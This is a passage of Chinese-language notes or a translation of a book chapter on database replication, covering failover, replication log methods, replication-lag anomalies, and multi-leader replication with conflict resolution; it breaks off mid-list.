<p>从库将主库收到的数据变更记录在其本地磁盘上。如果从库崩溃并重新启动，或主库和从库之间的网络暂时中断，则比较容易恢复：</p>
<ul>
<li>从库可以从日志中知道，在发生故障之前处理的最后一个事务。</li>
<li>从库可以连接到主库，并 == 请求在从库断开连接时发生的所有数据变更 ==。当应用完所有这些变化后，它就赶上了主库，并可以像以前一样继续接收数据变更流。</li>
</ul>
<h4 id="主库失效故障切换"><strong>主库失效：故障切换</strong></h4>
<p>主库失效处理起来相当棘手：其中一个从库需要被提升为新的主库，需要重新配置客户端，以将它们的写操作发送给新的主库，其他从库需要开始拉取来自新主库的数据变更。这个过程被称为<strong>故障切换（failover）</strong>。</p>
<p>故障切换可以手动进行（通知管理员主库挂了，并采取必要的步骤来创建新的主库）或自动进行。自动故障切换过程通常由以下步骤组成：</p>
<ol type="1">
<li>如果不是因维护故意关闭主库，首先要确认主库是否真的失效。大多数系统只是简单使用 <strong>超时（Timeout）</strong> ：节点频繁地相互来回传递消息，并且如果一个节点在一段时间内（例如 30 秒）没有响应，就认为它挂了。</li>
<li>选择一个新的主库。这可以通过选举过程（主库由剩余副本以多数选举产生）来完成，或者可以由之前选定的<strong>控制器节点（controller node）</strong>来指定新的主库。
<ol type="1">
<li>主库的最佳人选通常是拥有旧主库最新数据副本的从库（最小化数据损失）。</li>
<li>让所有的节点同意一个新的领导者，是一个<strong>共识</strong>问题，将在<a href="https://vonng.gitbooks.io/ddia-cn/content/ch9.html">第 9 章</a>详细讨论。</li>
</ol></li>
<li>重新配置系统以启用新的主库。
<ol type="1">
<li>客户端现在需要将它们的写请求发送给新主库。</li>
<li>老主库变为从库：如果老主库宕机恢复，可能仍然认为自己是主库，没有意识到其他副本已经让它下台了。系统需要确保老主库认可新主库，成为一个从库。</li>
</ol></li>
</ol>
<p>故障切换会出现很多麻烦：</p>
<ul>
<li>异步复制下，新主库可能没有收到老主库宕机前最后的写入操作。在选出新主库后，如果老主库重新加入集群，新主库在此期间可能会收到冲突的写入，那这些写入该如何处理？最常见的解决方案是简单丢弃老主库未复制的写入，这很可能打破客户对于数据持久性的期望。</li>
<li>如果数据库需要和其他外部存储相协调，那么 == 丢弃写入内容是极其危险的操作 ==。
<ul>
<li>例如在 GitHub 【13】的一场事故中，一个过时的 MySQL 从库被提升为主库。数据库使用自增 ID 作为主键，因为新主库的计数器落后于老主库的计数器，所以新主库重新分配了一些已经被老主库分配掉的 ID 作为主键。这些主键也在 Redis 中使用，主键重用使得 MySQL 和 Redis 中数据产生不一致，最后导致一些私有数据泄漏到错误的用户手中。</li>
</ul></li>
<li>发生某些故障时可能会出现两个节点都以为自己是主库的情况。这种情况称为 脑裂 (split brain)，非常危险：如果两个主库都可以接受写操作，却没有冲突解决机制（参见 “多领导者复制”），那么数据就可能丢失或损坏。
<ul>
<li>一些系统采取了安全防范措施：当检测到两个主库节点同时存在时会关闭其中一个节点，但设计粗糙的机制可能最后会导致两个节点都被关闭【14】。</li>
</ul></li>
<li>主库被宣告失效的超时时间应该怎么配置？
<ul>
<li>在主库真实失效的情况下，超时时间越长，意味着恢复时间也越长。</li>
<li>如果超时设置太短，又可能会出现不必要的故障切换。例如，临时负载峰值可能导致节点的响应时间超时，或网络故障可能导致数据包延迟。如果系统已经处于高负载或网络问题的困扰之中，那么不必要的故障切换可能会让情况变得更糟糕。</li>
</ul></li>
</ul>
<p>这些问题没有简单的解决方案。因此，即使软件支持自动故障切换，不少运维团队还是更愿意手动执行故障切换。</p>
<p>节点故障、不可靠的网络、对副本一致性，持久性，可用性和延迟的权衡 ，这些问题实际上是分布式系统中的基本问题。<a href="https://vonng.gitbooks.io/ddia-cn/content/ch8.html">第 8 章</a>和<a href="https://vonng.gitbooks.io/ddia-cn/content/ch9.html">第 9 章</a>将更深入地讨论它们。</p>
<h3 id="复制日志的实现"><strong>复制日志的实现</strong></h3>
<p>基于主库的复制底层是如何工作的？实践中有好几种不同的复制方式。</p>
<h4 id="基于语句的复制"><strong>基于语句的复制</strong></h4>
<p>在最简单的情况下，主库记录下它执行的每个写入请求（<strong>语句（statement）</strong>）并将该语句日志发送给其从库。对于关系数据库来说，这意味着每个 <code>INSERT</code>，<code>UPDATE</code> 或 <code>DELETE</code> 语句都被转发给每个从库，每个从库解析并执行该 SQL 语句，就像从客户端收到一样。</p>
<p>虽然听上去很合理，但有很多问题会搞砸这种复制方式：</p>
<ul>
<li>任何调用<strong>非确定性函数（nondeterministic）</strong>的语句，可能会在每个副本上生成不同的值。例如，使用 <code>NOW()</code> 获取当前日期时间，或使用 <code>RAND()</code> 获取一个随机数。</li>
<li>如果语句使用了<strong>自增列（auto increment）</strong>，或者依赖于数据库中的现有数据（例如，<code>UPDATE ... WHERE &lt;某些条件&gt;</code>），则必须在每个副本上按照完全相同的顺序执行它们，否则可能会产生不同的效果。当有多个并发执行的事务时，这可能成为一个限制。</li>
<li>有副作用的语句（例如，触发器，存储过程，用户定义的函数）可能会在每个副本上产生不同的副作用，除非副作用是绝对确定的。</li>
</ul>
<p>的确有办法绕开这些问题 —— 例如，当语句被记录时，主库可以用固定的返回值替换任何不确定的函数调用，以便从库获得相同的值。但是由于边缘情况实在太多了，现在通常会选择其他的复制方法。</p>
<p>基于语句的复制在 5.1 版本前的 MySQL 中使用。因为它相当紧凑，现在有时也还在用。现在 == 在默认情况下，如果语句中存在任何不确定性，MySQL 会切换到基于行的复制 ==。 VoltDB 使用了基于语句的复制，但要求事务必须是确定性的，以此来保证安全【15】。</p>
<h4 id="传输预写式日志wal"><strong>传输预写式日志（WAL）</strong></h4>
<p>通常写操作都是追加到日志中：</p>
<ul>
<li>对于日志结构存储引擎，日志是主要的存储位置。日志段在后台压缩，并进行垃圾回收。</li>
<li>对于覆写单个磁盘块的 <a href="https://vonng.gitbooks.io/ddia-cn/content/ch3.html#B树">B 树</a>，每次修改都会先写入 <strong>预写式日志（Write Ahead Log, WAL）</strong>，以便崩溃后索引可以恢复到一致的状态。</li>
</ul>
<p>在任何一种情况下，日志都是包含所有数据库写入的仅追加字节序列。可以使用完全相同的日志在另一个节点上构建副本：除了将日志写入磁盘之外，主库还可以通过网络将其发送给其从库。</p>
<p>当从库应用这个日志时，它会建立和主库一模一样数据结构的副本。</p>
<p>PostgreSQL 和 Oracle 等使用这种复制方法【16】。主要缺点是日志记录的数据非常底层：WAL 包含哪些磁盘块中的哪些字节发生了更改。这使复制与存储引擎紧密耦合。== 如果数据库将其存储格式从一个版本更改为另一个版本，通常不可能在主库和从库上运行不同版本的数据库软件。==</p>
<p>看上去这可能只是一个微小的实现细节，但却可能对运维产生巨大的影响。如果复制协议允许从库使用比主库更新的软件版本，则可以先升级从库，然后执行故障切换，使升级后的节点之一成为新的主库，从而执行数据库软件的零停机升级。如果复制协议不允许版本不匹配（传输 WAL 经常出现这种情况），则此类升级需要停机。</p>
<h4 id="逻辑日志复制基于行"><strong>逻辑日志复制（基于行）</strong></h4>
<p>另一种方法是，复制和存储引擎使用不同的日志格式，这样可以使复制日志从存储引擎内部分离出来。这种复制日志被称为逻辑日志，以将其与存储引擎的（物理）数据表示区分开来。</p>
<p>== 关系数据库的逻辑日志通常是以行的粒度描述对数据库表的写入的记录序列 ==：</p>
<ul>
<li>对于插入的行，日志包含所有列的新值。</li>
<li>对于删除的行，日志包含足够的信息来唯一标识已删除的行。通常是主键，但是如果表上没有主键，则需要记录所有列的旧值。</li>
<li>对于更新的行，日志包含足够的信息来唯一标识更新的行，以及所有列的新值（或至少所有已更改的列的新值）。</li>
</ul>
<p>修改多行的事务会生成多个这样的日志记录，后面跟着一条记录，指出事务已经提交。 MySQL 的二进制日志（当配置为使用基于行的复制时）使用这种方法【17】。</p>
<p>== 由于逻辑日志与存储引擎内部分离，因此可以更容易地保持向后兼容，从而使领导者和跟随者能够运行不同版本的数据库软件甚至不同的存储引擎。==</p>
<p>对于外部应用程序来说，逻辑日志格式也更容易解析。如果要将数据库的内容发送到外部系统（如数据），这一点很有用，例如复制到数据仓库进行离线分析，或建立自定义索引和缓存【18】。 这种技术被称为 <strong>数据变更捕获（change data capture）</strong>。</p>
<h4 id="基于触发器的复制"><strong>基于触发器的复制</strong></h4>
<p>到目前为止描述的复制方法是由数据库系统实现的，不涉及任何应用程序代码。在很多情况下，这就是你想要的。但在某些情况下需要更多的灵活性。例如，如果您只想复制数据的一个子集，或者想从一种数据库复制到另一种数据库，或者如果您需要冲突解决逻辑（参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#处理写入冲突">处理写入冲突</a>”），则可能需要将复制移动到应用程序层。</p>
<p>一些工具，如 Oracle Golden Gate 【19】，可以通过读取数据库日志，使得其他应用程序可以使用数据。另一种方法是使用许多关系数据库自带的功能：触发器和存储过程。</p>
<p>触发器允许您注册在数据库系统中发生数据更改（写入事务）时自动执行的自定义应用程序代码。触发器有机会将更改记录到一个单独的表中，使用外部程序读取这个表，再加上任何业务逻辑处理，会后将数据变更复制到另一个系统去。例如，Databus for Oracle 【20】和 Bucardo for Postgres 【21】就是这样工作的。</p>
<p>基于触发器的复制通常比其他复制方法具有更高的开销，并且比数据库的内置复制更容易出错，也有很多限制。然而由于其灵活性，仍然是很有用的。</p>
<h2 id="复制延迟问题"><strong>复制延迟问题</strong></h2>
<p>容忍节点故障只是需要复制的一个原因。另一个原因是可扩展性（处理比单个机器更多的请求）和延迟（让副本在地理位置上更接近用户）。</p>
<p>基于主库的复制要求所有写入都由单个节点处理，但只读查询可以由任何副本处理。所以对于读多写少的场景（Web 上的常见模式），一个有吸引力的选择是创建很多从库，并将读请求分散到所有的从库上去。这样能减小主库的负载，并允许向最近的副本发送读请求。</p>
<p>在这种扩展体系结构中，只需添加更多的追随者，就可以提高只读请求的服务容量。但是，这种方法实际上 == 只适用于异步复制 ==—— 如果尝试同步复制到所有追随者，则单个节点故障或网络中断将使整个系统无法写入。而且越多的节点越有可能会被关闭，所以完全同步的配置是非常不可靠的。</p>
<p>不幸的是，当应用程序 == 从异步从库读取时，如果从库落后，它可能会看到过时的信息 ==。这会导致数据库中出现明显的不一致：同时对主库和从库执行相同的查询，可能得到不同的结果，因为并非所有的写入都反映在从库中。这种不一致只是一个暂时的状态 ——== 如果停止写入数据库并等待一段时间，从库最终会赶上并与主库保持一致 ==。出于这个原因，这种效应被称为 <strong>最终一致性（eventually consistency）</strong></p>
<blockquote>
<p>“最终” 一词故意含糊不清：总的来说，副本落后的程度是没有限制的。在正常的操作中，<strong>复制延迟（replication lag）</strong>，即写入主库到反映至从库之间的延迟，可能仅仅是几分之一秒，在实践中并不显眼。但如果系统在接近极限的情况下运行，或网络中存在问题，延迟可以轻而易举地超过几秒，甚至几分钟。</p>
</blockquote>
<p>因为滞后时间太长引入的不一致性，可不仅是一个理论问题，更是应用设计中会遇到的真实问题。本节将重点介绍三个由复制延迟问题的例子，并简述解决这些问题的一些方法。</p>
<h3 id="读己之写"><strong>读己之写</strong></h3>
<p>许多应用允许用户提交一些数据，然后查看他们提交的内容。</p>
<ul>
<li>提交新数据时，必须将其发送给主库</li>
<li>但是当用户查看数据时，可以通过从库进行读取</li>
</ul>
<p>如果数据经常被查看，但只是偶尔写入，这是非常合适的。</p>
<p>对于异步复制，如果用户在写入后马上就查看数据，则新数据可能尚未到达副本。对用户而言，看起来好像是刚提交的数据丢失了，所以他们不高兴是可以理解的。</p>
<p><img src="fig5-3.png"></p>
<p><strong>图 5-3 用户写入后从旧副本中读取数据。需要写后读 (read-after-write) 的一致性来防止这种异常</strong></p>
<p>在这种情况下，需要 <strong>写后读一致性（read-after-write consistency）</strong>，也称为 <strong>读己之写一致性（read-your-writes consistency）</strong>【24】。这是一个保证，如果用户重新加载页面，他们总会看到他们自己提交的任何更新。它不会对其他用户的写入做出承诺：其他用户的更新可能稍等才会看到。它保证用户自己的输入已被正确保存。</p>
<p>如何在基于领导者的复制系统中实现写后读一致性？有各种可能的技术，这里说一些：</p>
<ul>
<li><p>== 对于用户可能修改过的内容，总是从主库读取 ==；这就要求得有办法不通过实际的查询就可以知道用户是否修改了某些东西。</p>
<ul>
<li>举个例子，社交网络上的用户个人资料信息通常只能由用户本人编辑，而不能由其他人编辑。因此一个简单的规则就是：总是从主库读取用户自己的档案，如果要读取其他用户的档案就去从库。</li>
</ul></li>
<li><p>如果应用中的大部分内容都可能被用户编辑，那这种方法就没用了，因为大部分内容都必须从主库读取。在这种情况下可以使用其他标准来决定是否从主库读取。</p>
<ul>
<li>例如可以跟踪上次更新的时间，在上次更新后的一分钟内，从主库读。还可以监控从库的复制延迟，防止向任何滞后主库超过一分钟的从库发出查询。</li>
</ul></li>
<li><p>客户端可以记住最近一次写入的时间戳，系统需要确保从库在处理该用户的读取请求时，该时间戳前的变更都已经传播到了本从库中。如果当前从库不够新，则<strong>可以从另一个从库读取，或者等待从库追赶上来</strong>。</p>
<ul>
<li>这里的时间戳可以是逻辑时间戳（表示写入顺序的东西，例如日志序列号）或实际的系统时钟（在这种情况下，时钟同步变得至关重要，请参阅 “<strong><a href="http://ddia.vonng.com/#/ch8?id=不可靠的时钟">不可靠的时钟</a></strong>”）。</li>
</ul></li>
<li><p>如果你的副本分布在多个数据中心（为了在地理上接近用户或者出于可用性目的），还会有额外的复杂性。任何需要由主库提供服务的请求都必须路由到包含该主库的数据中心。</p></li>
</ul>
<p>另一种复杂的情况发生在同一位用户从多个设备（例如桌面浏览器和移动 APP）请求服务的时候。这种情况下可能就需要提供跨设备的写后读一致性：如果用户在一个设备上输入了一些信息，然后在另一个设备上查看，则应该看到他们刚输入的信息。</p>
<p>在这种情况下，还有一些需要考虑的问题：</p>
<ul>
<li>记住用户上次更新时间戳的方法变得更加困难，因为一个设备上运行的程序不知道另一个设备上发生了什么。需要对这些元数据进行中心化的存储。</li>
<li>如果副本分布在不同的数据中心，很难保证来自不同设备的连接会路由到同一数据中心。（例如，用户的台式计算机使用家庭宽带连接，而移动设备使用蜂窝数据网络，则设备的网络路由可能完全不同）。如果你的方法需要读主库，可能首先需要把来自该用户所有设备的请求都路由到同一个数据中心。</li>
</ul>
<h3 id="单调读"><strong>单调读</strong></h3>
<p>在从异步从库读取时可能发生的异常的第二个例子是用户可能会遇到 <strong>时光倒流（moving backward in time）</strong>。</p>
<p>用户从不同从库进行多次读取，就可能发生这种情况。例如，一个查询评论列表的读取场景，用户刷新网页时每个请求都被路由到一个随机的服务器，就可能出现用户 2345：</p>
<ol type="1">
<li>首先查询了一个延迟很小的从库，查询返回了最近由用户 1234 添加的评论</li>
<li>然后查询了一个延迟较大的从库，查询不返回任何东西，因为滞后的从库还没有拉取到该写入内容。实际上可以认为第二个查询是在比第一个查询更早的时间点上观察系统。</li>
</ol>
<p>如果第一个查询没有返回任何内容，那问题并不大，因为 可能不知道用户 1234 最近添加了评论。但如果用户 2345 先看见用户 1234 的评论，然后又看到它消失，这就会让人觉得非常困惑了。</p>
<p><strong>单调读（monotonic reads）</strong>【23】可以保证这种异常不会发生。这是一个比 <strong>强一致性（strong consistency）</strong> 更弱，但比 <strong>最终一致性（eventual consistency）</strong> 更强的保证。当读取数据时，你可能会看到一个旧值；单调读仅意味着如果用户顺序地进行多次读取，他们不会看到时间回退，也就是说，如果已经读取到较新的数据，后续的读取不会得到更旧的数据。</p>
<p>== 实现单调读的一种方式是确保每个用户总是从同一副本进行读取 ==（不同的用户可以从不同的副本读取）。例如，可以基于用户 ID 的散列来选择副本，而不是随机选择副本。但是，如果该副本出现故障，用户的查询将需要重新路由到另一个副本。</p>
<h3 id="一致前缀读"><strong>一致前缀读</strong></h3>
<p>第三个复制延迟异常的例子违反了因果律。 想象一下 Poons 先生和 Cake 夫人之间的以下简短对话：</p>
<p><em>Mr. Poons</em></p>
<blockquote>
<p>Mrs. Cake，你能看到多远的未来？</p>
</blockquote>
<p><em>Mrs. Cake</em></p>
<blockquote>
<p>通常约十秒钟，Mr. Poons.</p>
</blockquote>
<p>这两句话之间有因果关系：Cake 夫人听到了 Poons 先生的问题并回答了这个问题。</p>
<p>现在，想象第三个人正在通过从库来听这个对话。 Cake 夫人说的内容是从一个延迟很低的从库读取的，但 Poons 先生所说的内容，从库的延迟要大的多（见 <strong><a href="http://ddia.vonng.com/#/img/fig5-5.png">图 5-5</a></strong>）。于是，这个观察者会听到以下内容：</p>
<p><em>Mrs. Cake</em></p>
<blockquote>
<p>通常约十秒钟，Mr. Poons.</p>
</blockquote>
<p><em>Mr. Poons</em></p>
<blockquote>
<p>Mrs. Cake，你能看到多远的未来？</p>
</blockquote>
<p>对于观察者来说，看起来好像 Cake 夫人在 Poons 先生提问前就回答了这个问题。这种超能力让人印象深刻，但也会把人搞糊涂。【25】。</p>
<p><img src="fig5-5.png"></p>
<p><strong>图 5-5 如果某些分区的复制速度慢于其他分区，那么观察者可能会在看到问题之前先看到答案。</strong></p>
<p>要防止这种异常，需要另一种类型的保证：<strong>一致前缀读（consistent prefix reads）</strong>【23】。这个保证的意思是说：如果一系列写入按某个顺序发生，那么任何人读取这些写入时，也会看见它们以同样的顺序出现。</p>
<p>这是 <strong>分区（partitioned）</strong> 或 <strong>分片（sharded）</strong> 数据库中的一个特殊问题：</p>
<ul>
<li>如果数据库总是以相同的顺序应用写入，例如上面的单 leader 场景，读取总是看到一致的前缀，这种异常不会发生。</li>
<li>但是在许多分布式数据库中，不同的分区独立运行，因此不存在 <strong>全局的写入顺序</strong>：当用户从数据库中读取数据时，各个分区分别读取，可能会看到数据库的某些部分处于较旧的状态，而某些则处于较新的状态。</li>
</ul>
<p>解决方案：</p>
<ul>
<li>确保任何因果相关的写入都写入相同的分区，但在一些应用中可能无法高效地完成这种操作。</li>
<li>显式跟踪因果依赖关系，参考 “<strong><a href="http://ddia.vonng.com/#/ch5?id=“此前发生”的关系和并发">“此前发生” 的关系和并发</a></strong>” 。</li>
</ul>
<h3 id="复制延迟的解决方案"><strong>复制延迟的解决方案</strong></h3>
<p>在使用最终一致的系统时，如果复制延迟增加到几分钟甚至几小时，则应该考虑应用程序的行为。如果答案是 “没问题”，那很好。但如果结果对于用户来说是不好的体验，那么设计系统来提供更强的保证（例如 <strong>写后读</strong>）是很重要的。明明是异步复制却假设复制是同步的，这是很多麻烦的根源。</p>
<p>如前所述，应用程序可以提供比底层数据库更强有力的保证，例如通过主库进行某种读取。但在应用程序代码中处理这些问题是复杂的，容易出错。</p>
<p>如果应用程序开发人员不必担心微妙的复制问题，并可以信赖他们的数据库 “做了正确的事情”，那该多好呀。这就是 <strong>事务（transaction）</strong> 存在的原因：<strong>数据库通过事务提供强大的保证</strong>，所以应用程序可以更加简单。</p>
<p>单节点事务已经存在了很长时间。然而在走向分布式（复制和分区）数据库时，许多系统放弃了事务，声称事务在性能和可用性上的代价太高，并断言在可伸缩系统中最终一致性是不可避免的。这个叙述有一些道理，但过于简单了，本书其余部分将提出更为细致的观点。我们将在 <strong><a href="http://ddia.vonng.com/#/ch7">第七章</a></strong> 和 <strong><a href="http://ddia.vonng.com/#/ch9">第九章</a></strong> 回到事务的话题，并将在 <strong><a href="http://ddia.vonng.com/#/part-iii">第三部分</a></strong> 讨论一些替代机制。</p>
<h2 id="多主复制"><strong>多主复制</strong></h2>
<p>基于单个领导者的复制有一个主要的缺点：只有一个主库，而所有的写入都必须通过它。如果出于任何原因（例如和主库之间的网络连接中断）无法连接到主库， 就无法向数据库写入。</p>
<blockquote>
<p>如果数据库被分区（见第 6 章），每个分区都有一个领导。 不同的分区可能在不同的节点上有其领导者，但是每个分区必须有一个领导者节点</p>
</blockquote>
<p>基于领导者的复制模型的自然延伸是允许多个节点接受写入。 复制仍然以同样的方式发生：处理写入的每个节点都必须将该数据更改转发给所有其他节点。 称之为<strong>多领导者配置</strong>（也称多主、多活复制）。 在这种情况下，每个领导者同时扮演其他领导者的追随者。</p>
<h3 id="多主复制的应用场景"><strong>多主复制的应用场景</strong></h3>
<ul>
<li>常用于多数据中心场景</li>
<li>在单个数据中心内部使用多个主库基本无意义，因为好处很少超过复杂性的代价。 但在一些情况下，多活配置是也合理的。</li>
</ul>
<h4 id="运维多个数据中心"><strong>运维多个数据中心</strong></h4>
<p>假如你有一个数据库，副本分散在好几个不同的数据中心（也许这样可以容忍单个数据中心的故障，或地理上更接近用户）。 使用常规的基于领导者的复制设置，主库必须位于其中一个数据中心，且所有写入都必须经过该数据中心。</p>
<p>多领导者配置中可以在每个数据中心都有主库。 <a href="fig5-6.png">图 5-6</a> 展示了这个架构的样子。 在每个数据中心内使用常规的主从复制；在数据中心之间，每个数据中心的主库都会将其更改复制到其他数据中心的主库中。</p>
<p><img src="fig5-6.png"></p>
<p><strong>图 5-6 跨多个数据中心的多主复制</strong></p>
<p>我们来比较一下在运维多个数据中心时，单主和多主的适应情况。</p>
<p><strong>性能</strong></p>
<ul>
<li>在单活配置中，每个写入都必须穿过互联网，进入主库所在的数据中心。这可能会增加写入时间，并可能违背了设置多个数据中心的初心。</li>
<li>在多活配置中，每个写操作都可以在本地数据中心进行处理，并与其他数据中心异步复制。因此，数据中心之间的网络延迟对用户来说是透明的，这意味着感觉到的性能可能会更好。</li>
</ul>
<p><strong>容忍数据中心停机</strong></p>
<ul>
<li>在单主配置中，如果主库所在的数据中心发生故障，故障切换可以使另一个数据中心里的追随者成为领导者。</li>
<li>在多活配置中，每个数据中心可以独立于其他数据中心继续运行，并且当发生故障的数据中心归队时，复制会自动赶上。</li>
</ul>
<p><strong>容忍网络问题</strong></p>
<ul>
<li>数据中心之间的通信通常穿过公共互联网，这可能不如数据中心内的本地网络可靠。单主配置对这数据中心间的连接问题非常敏感，因为通过这个连接进行的写操作是同步的。</li>
<li>采用异步复制功能的多活配置通常能更好地承受网络问题：临时的网络中断并不会妨碍正在处理的写入。</li>
</ul>
<p>有些数据库默认情况下支持多主配置，但使用外部工具实现也很常见，例如用于 MySQL 的 Tungsten Replicator 【26】，用于 PostgreSQL 的 BDR【27】以及用于 Oracle 的 GoldenGate 【19】。</p>
<p>尽管多主复制有这些优势，但也有一个很大的缺点：两个不同的数据中心可能会同时修改相同的数据，写冲突是必须解决的（如<a href="fig5-6.png">图 5-6</a> 中 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#冲突解决">冲突解决</a>”）。本书将在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#处理写入冲突">处理写入冲突</a>” 中详细讨论这个问题。</p>
<p>由于多主复制在许多数据库中都属于改进的功能，所以常常存在微妙的配置缺陷，且经常与其他数据库功能之间出现意外的反应。例如自增主键、触发器、完整性约束等，都可能会有麻烦。因此，== 多主复制往往被认为是危险的领域，应尽可能避免 ==【28】。</p>
<h4 id="需要离线操作的客户端"><strong>需要离线操作的客户端</strong></h4>
<p>多主复制的另一种适用场景是：应用程序在断网之后仍然需要继续工作。</p>
<p>例如，考虑手机，笔记本电脑和其他设备上的日历应用。无论设备目前是否有互联网连接，你需要能随时查看你的会议（发出读取请求），输入新的会议（发出写入请求）。如果在离线状态下进行任何更改，则设备下次上线时，需要与服务器和其他设备同步。</p>
<p>在这种情况下，每个设备都有一个充当领导者的本地数据库（它接受写请求），并且在所有设备上的日历副本之间同步时，存在异步的多主复制过程。复制延迟可能是几小时甚至几天，具体取决于何时可以访问互联网。</p>
<p>从架构的角度来看，这种设置实际上与数据中心之间的多领导者复制类似，每个设备都是一个 “数据中心”，而它们之间的网络连接是极度不可靠的。从历史上各类日历同步功能的破烂实现可以看出，想把多活配好是多么困难的一件事。</p>
<p>有一些工具旨在使这种多领导者配置更容易。例如，CouchDB 就是为这种操作模式而设计的【29】。</p>
<h4 id="协同编辑"><strong>协同编辑</strong></h4>
<p>实时协作编辑应用程序允许多个人同时编辑文档。例如，Etherpad 【30】和 Google Docs 【31】允许多人同时编辑文本文档或电子表格（该算法在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#自动冲突解决">自动冲突解决</a>” 中简要讨论）。我们通常不会将协作式编辑视为数据库复制问题，但与前面提到的离线编辑用例有许多相似之处。当一个用户编辑文档时，所做的更改将立即应用到其本地副本（Web 浏览器或客户端应用程序中的文档状态），并异步复制到服务器和编辑同一文档的任何其他用户。</p>
<p>如果要保证不会发生编辑冲突，则应用程序必须先取得文档的锁定，然后用户才能对其进行编辑。如果另一个用户想要编辑同一个文档，他们首先必须等到第一个用户提交修改并释放锁定。这种协作模式相当于单领导者复制，仅在领导者上进行写操作。</p>
<p>但是，为了加速协作，您可能希望将更改的单位设置得非常小（例如，一次按键），并避免锁定。这种方法允许多个用户同时进行编辑，但同时也带来了多领导者复制的所有挑战，包括需要解决冲突【32】。</p>
<h3 id="处理写入冲突"><strong>处理写入冲突</strong></h3>
<p>多领导者复制的最大问题是可能发生写冲突，这意味着需要解决冲突。</p>
<p>例如，考虑一个由两个用户同时编辑的维基页面，如<a href="fig5-7.png">图 5-7</a> 所示。用户 1 将页面的标题从 A 更改为 B，并且用户 2 同时将标题从 A 更改为 C。每个用户的更改已成功应用到其本地主库。但当异步复制时，会发现冲突【33】。单主数据库中不会出现此问题。</p>
<p><img src="fig5-7.png"></p>
<p><strong>图 5-7 两个主库同时更新同一记录引起的写入冲突</strong></p>
<h4 id="同步与异步冲突检测"><strong>同步与异步冲突检测</strong></h4>
<p>在单主数据库中，第二个写入将被阻塞，并等待第一个写入完成，或中止第二个写入事务，强制用户重试。另一方面，在多活配置中，两个写入都是成功的，并且在稍后的时间点仅仅异步地检测到冲突。那时要求用户解决冲突可能为时已晚。</p>
<p>原则上，可以使冲突检测同步 - 即等待写入被复制到所有副本，然后再告诉用户写入成功。但是，通过这样做，您将失去多主复制的主要优点：允许每个副本独立接受写入。如果您想要同步冲突检测，那么您可以使用单主程序复制。</p>
<h4 id="避免冲突"><strong>避免冲突</strong></h4>
<p>处理冲突的最简单的策略就是避免它们：如果应用程序可以确保特定记录的所有写入都通过同一个领导者，那么冲突就不会发生。由于多领导者复制处理的许多实现冲突相当不好，避免冲突是一个经常推荐的方法【34】。</p>
<ul>
<li>类似于分片的单 leader 场景</li>
</ul>
<p>例如，在用户可以编辑自己的数据的应用程序中，可以确保来自特定用户的请求始终路由到同一数据中心，并使用该数据中心的领导者进行读写。不同的用户可能有不同的 “家庭” 数据中心（可能根据用户的地理位置选择），但从任何用户的角度来看，配置基本上都是单一的领导者。</p>
<p>但是，有时您可能需要更改指定的记录的主库 —— 可能是因为一个数据中心出现故障，您需要将流量重新路由到另一个数据中心，或者可能是因为用户已经迁移到另一个位置，现在更接近不同的数据中心。在这种情况下，冲突避免会中断，你必须处理不同主库同时写入的可能性。</p>
<h4 id="收敛至一致的状态"><strong>收敛至一致的状态</strong></h4>
<p>单主数据库按顺序应用写操作：如果同一个字段有多个更新，则最后一个写操作将确定该字段的最终值。</p>
<p>在多主配置中，写入顺序没有定义，所以最终值应该是什么并不清楚。在<a href="fig5-7.png">图 5-7</a> 中，在主库 1 中标题首先更新为 B 而后更新为 C；在主库 2 中，首先更新为 C，然后更新为 B。两个顺序都不是 “更正确” 的。</p>
<p>如果每个副本只是按照它看到写入的顺序写入，那么数据库最终将处于不一致的状态：最终值将是在主库 1 的 C 和主库 2 的 B。这是不可接受的，每个复制方案都必须确保数据在所有副本中最终都是相同的。因此，数据库必须以一种<strong>收敛（convergent）</strong>的方式解决冲突，这意味着所有副本必须在所有变更复制完成时收敛至一个相同的最终值。</p>
<p>实现冲突合并解决有多种途径：</p>
<ul>
<li>给每个写入一个唯一的 ID（例如，一个时间戳，一个长的随机数，一个 UUID 或者一个键和值的哈希），挑选最高 ID 的写入作为胜利者，并丢弃其他写入。如果使用时间戳，这种技术被称为<strong>最后写入胜利（LWW, last write wins）</strong>。虽然这种方法很流行，但是很容易造成数据丢失【35】。我们将在<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#检测并发写入">本章末尾</a>更详细地讨论 LWW。</li>
<li>为每个副本分配一个唯一的 ID，ID 编号更高的写入具有更高的优先级。这种方法也意味着数据丢失。</li>
<li>以某种方式将这些值合并在一起 - 例如，按字母顺序排序，然后连接它们（在<a href="fig5-7.png">图 5-7</a> 中，合并的标题可能类似于 “B/C”）。</li>
<li>在保留所有信息的显式数据结构中记录冲突，并编写解决冲突的应用程序代码（也许通过提示用户的方式）。</li>
</ul>
<h4 id="自定义冲突解决逻辑"><strong>自定义冲突解决逻辑</strong></h4>
<p>作为解决冲突最合适的方法可能取决于应用程序，大多数多主复制工具允许使用应用程序代码编写冲突解决逻辑。该代码可以在写入或读取时执行：</p>
<p><strong><em>写时执行</em></strong></p>
<p>只要数据库系统检测到复制更改日志中存在冲突，就会调用冲突处理程序。例如，Bucardo 允许您为此编写一段 Perl 代码。这个处理程序通常不能提示用户 —— 它在后台进程中运行，并且必须快速执行。</p>
<p><strong><em>读时执行</em></strong></p>
<p>当检测到冲突时，所有冲突写入被存储。下一次读取数据时，会将这些多个版本的数据返回给应用程序。应用程序可能会提示用户或自动解决冲突，并将结果写回数据库。例如，CouchDB 以这种方式工作。</p>
<p>请注意，冲突解决通常适用于单个行或文档层面，而不是整个事务【36】。因此，如果您有一个事务会原子性地进行几次不同的写入（请参阅第 7 章），则对于冲突解决而言，每个写入仍需分开单独考虑。</p>
<blockquote>
<p>题外话：自动冲突解决</p>
<p>冲突解决规则可能很快变得复杂，并且自定义代码可能容易出错。亚马逊是一个经常被引用的例子，由于冲突解决处理程序令人惊讶的效果：一段时间以来，购物车上的冲突解决逻辑将保留添加到购物车的物品，但不包括从购物车中移除的物品。因此，顾客有时会看到物品重新出现在他们的购物车中，即使他们之前已经被移走【37】。</p>
<p>已经有一些有趣的研究来自动解决由于数据修改引起的冲突。有几行研究值得一提：</p>
<ul>
